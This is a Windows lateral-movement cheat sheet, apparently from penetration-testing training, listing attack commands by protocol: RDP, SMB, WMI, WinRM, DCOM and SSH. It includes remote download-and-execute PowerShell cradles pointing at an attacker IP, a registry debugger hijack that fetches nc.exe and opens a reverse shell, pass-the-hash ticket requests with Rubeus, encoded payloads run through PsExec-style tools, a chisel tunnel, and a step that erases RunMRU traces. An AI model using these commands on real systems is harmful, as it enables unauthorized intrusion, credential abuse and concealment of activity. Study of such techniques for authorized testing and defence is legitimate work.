title: Windows Lateral Movement
html:
Windows Lateral Movement

Remote Desktop Protocol (RDP)

Open Remote Desktop Connection client

mstsc.exe

Open Remote Desktop Connection client in Restricted Admin mode

mstsc.exe /restrictedAdmin

Query DisableRestrictedAdmin value in LSA settings

reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

Disable Restricted Admin

reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD

Enable Restricted Admin

reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD

Connect to chisel server with SOCKS proxy

.\chisel.exe client <ATTACK HOST>:<PORT> R:socks

Create sacrificial logon session with Rubeus

.\Rubeus.exe createnetonly /program:powershell.exe /show

Ask for TGT using specified user and RC4 hash with Rubeus

.\Rubeus.exe asktgt /user:<USER> /rc4:<HASH> /domain:<domain> /ptt

Execute PowerShell command on SRV01 via RDP using SharpRDP with specified credentials

.\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=<domain-name>\<USER> password=<PASS>

Download Program.cs from specified URI

wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs

Compile CleanRunMRU.cs using C# compiler

C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs

Execute CleanRunMRU.exe with clearall argument

.\CleanRunMRU.exe clearall

Server Message Block (SMB)

Execute command on remote server using PsExec

.\PsExec.exe \\SRV02 -i -s -u <domain-name>\<USER> -p <PASS> cmd

Execute SharpNoPSExec with target and payload parameters

.\SharpNoPSExec.exe --target=<TARGETIP> --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="

Execute NimExec with specified user, domain, password, target, and command

.\NimExec -u <USER> -d <domain> -p <PASS> -t <TARGETIP> -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v

Add debugger key to msedge.exe in registry

reg.exe add "\\srv02.<domain>\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe && nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"

Enable SMB Guest Share folder access

reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f

Windows Management Instrumentation (WMI)

Get OS details from remote machine using WMIC

wmic /node:<TARGETIP> os get Caption,CSDVersion,OSArchitecture,Version

Get OS details from remote machine using PowerShell

Get-WmiObject -Class Win32_OperatingSystem -ComputerName <TARGETIP> | Select-Object Caption, CSDVersion, OSArchitecture, Version

Execute notepad.exe on remote machine using WMIC

wmic /node:<TARGETIP> process call create "notepad.exe"

Execute notepad.exe on remote machine using PowerShell and WMI

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName <TARGETIP>

Query OS details with specified credentials using WMIC

wmic /user:username /password:password /node:<TARGETIP> os get Caption,CSDVersion,OSArchitecture,Version

Execute PowerShell command with specified credentials using WMI

$credential = New-Object System.Management.Automation.PSCredential("<USER>", (ConvertTo-SecureString "<PASS>" -AsPlainText -Force)); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" -ComputerName <TARGETIP>

Windows Remote Management (WinRM)

Invoke command on remote server using WinRM

Invoke-Command -ComputerName <TARGETIP> -ScriptBlock { hostname;whoami }

Invoke command on remote server with specified credentials using WinRM

$username = "<USER>"; $password = "<PASS>";$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword);Invoke-Command -ComputerName <TARGETIP> -Credential $credential -ScriptBlock { whoami; hostname }

Execute PowerShell commands on remote server using WinRS

winrs -r:<TARGETIP> "powershell -c whoami;hostname"

Execute PowerShell commands on remote server with specified credentials using WinRS

winrs /remote:<TARGETIP> /username:<USER> /password:<PASS> "powershell -c whoami;hostname"

Create PowerShell session, copy files, and enter session on remote server using WinRM

$sessionSRV02 = New-PSSession -ComputerName <TARGETIP> -Credential $credential;Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\<USER>\Desktop\Sample.txt' -Destination 'C:\Users\<USER>\Desktop\Sample.txt' -Verbose;Copy-Item -FromSession $sessionSRV02 -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\Users\<USER>\Desktop\host.txt' -Verbose;Enter-PSSession $sessionSRV02

Distributed Component Object Model (DCOM)

Query ShellWindows CLSID in registry using PowerShell

Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-Object{Get-ItemProperty -Path $_.PSPath | Where-Object {$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty PSChildName}

Create instance of ShellWindows using specified CLSID on remote server

$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","<TARGETIP>"))

Secure Shell (SSH)

Connect to SRV01 using SSH

ssh ambioris@<TARGET>

Connect to SRV01 using SSH with specified key, username, and port

ssh -i C:\helen_id_rsa -l <USER>@<domain> -p <TARGET_PORT> <TARGET>

Display or modify ACLs for C:\helen_id_rsa

icacls.exe C:\helen_id_rsa

Remote Management Tools

Test connection to <TARGET> on port 5900

Test-NetConnection -ComputerName <TARGET> -Port 5900

Query TightVNC server settings in registry

reg query HKLM\SOFTWARE\TightVNC\Server /s
excerpt: Windows Lateral Movement Remote Desktop Protocol (RDP) Open Remote Desktop Connection client mstsc.exe Open Remote Desktop Connection client in Restricted Admin mode mstsc.exe /restrictedAdmin Query D…
